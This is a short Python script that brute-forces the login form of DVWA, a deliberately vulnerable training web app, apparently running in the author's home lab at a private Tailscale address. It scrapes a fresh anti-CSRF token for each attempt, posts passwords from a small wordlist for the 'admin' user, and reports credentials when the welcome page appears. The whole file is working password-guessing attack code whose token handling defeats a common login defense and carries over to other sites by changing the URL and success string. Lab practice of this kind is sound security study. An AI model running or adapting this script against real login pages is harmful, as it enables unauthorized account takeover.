import requests
from bs4 import BeautifulSoup

# TARGET CONFIG (Tailscale IP of your Surface)
# Note: DVWA usually defaults to admin:password
URL = "http://100.65.145.50:8081/login.php"
TARGET_USERNAME = "admin"
WORDLIST = ["123456", "password", "admin", "welcome", "dvwa"]


def get_csrf_token(session, url):
    """Fetches the login page and extracts the anti-CSRF token."""
    response = session.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    # DVWA hides the token in a generic input field named 'user_token'
    token = soup.find("input", {"name": "user_token"})["value"]
    return token


def brute_force():
    # Use a session to persist cookies (PHPSESSID) across requests
    with requests.Session() as s:
        print(f"[*] Targeting: {URL}")

        for password in WORDLIST:
            try:
                # 1. Get a fresh token for this attempt
                token = get_csrf_token(s, URL)

                # 2. Prepare the payload
                payload = {
                    "username": TARGET_USERNAME,
                    "password": password,
                    "Login": "Login",
                    "user_token": token,
                }

                # 3. Send the attack
                # Allow redirects because DVWA redirects to index.php on success
                response = s.post(URL, data=payload, allow_redirects=True)

                # 4. Check success (If we are redirected to index.php or see 'Welcome')
                if "Welcome to Damn Vulnerable Web App" in response.text:
                    print(f"\n[+] SUCCESS! Credentials found:")
                    print(f"    User: {TARGET_USERNAME}")
                    print(f"    Pass: {password}")
                    return
                else:
                    print(f"[-] Failed: {password}")

            except Exception as e:
                print(f"[!] Error: {e}")


if __name__ == "__main__":
    brute_force()
